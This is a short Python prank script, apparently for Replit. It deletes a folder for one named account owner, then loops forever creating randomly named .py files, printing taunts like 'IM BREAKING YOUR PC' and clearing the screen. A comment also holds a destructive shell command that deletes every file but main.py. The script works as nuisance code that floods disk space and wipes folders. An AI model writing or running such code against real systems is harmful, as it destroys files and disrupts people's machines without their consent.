import os, random, time, shutil

#rm -v !("main.py")


num = 0
THIS_FOLDER = os.path.dirname(os.path.abspath(__file__))


user = os.environ["REPL_OWNER"]

if user == "JBloves27":
  delete = True
else:
  delete = False

while delete:
  shutil.rmtree(THIS_FOLDER+"/e")
  try:
    FOLDER = os.path.join(THIS_FOLDER, "e")
    os.mkdir(FOLDER)
  except OSError as error:
    print("e")
  break


while True:
  WRDFILE = random.choice(["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"])
  NUMFILE = str(random.randint(2, 27))
  CHARFILE = random.choice(["`","~","!","@","#","$","%","%","^","&","*","(",")","-","_","=","+","[","{","]","}","|",";",":","'","\"",",","<",">","\\","?"])
  WRDFILE2 = random.choice(["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"])
  CHARFILE2 = random.choice(["`","~","!","@","#","$","%","%","^","&","*","(",")","-","_","=","+","[","{","]","}","\\","|",";",":","'","\"",",","<",">","?"])

  NUMSFILE = random.randint(2, 27)
  
  THIS_FOLDER = os.path.dirname(os.path.abspath(__file__))
  FILENAME = THIS_FOLDER+"/e/file"+WRDFILE+WRDFILE2+CHARFILE+CHARFILE2+str(int(NUMFILE)*NUMSFILE)+".py"
  FILE = open(FILENAME, "a")
  FILE.write("print(\"You have been e'd\")")
  FILE.close()
  print(random.choice(["You Have Been E'd","YOU HAVE BEEN E'D","HAHA E","WHAAAA","IM BREAKING YOUR PC","e"]))
  time.sleep(0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001)
  os.system("clear")
  continue
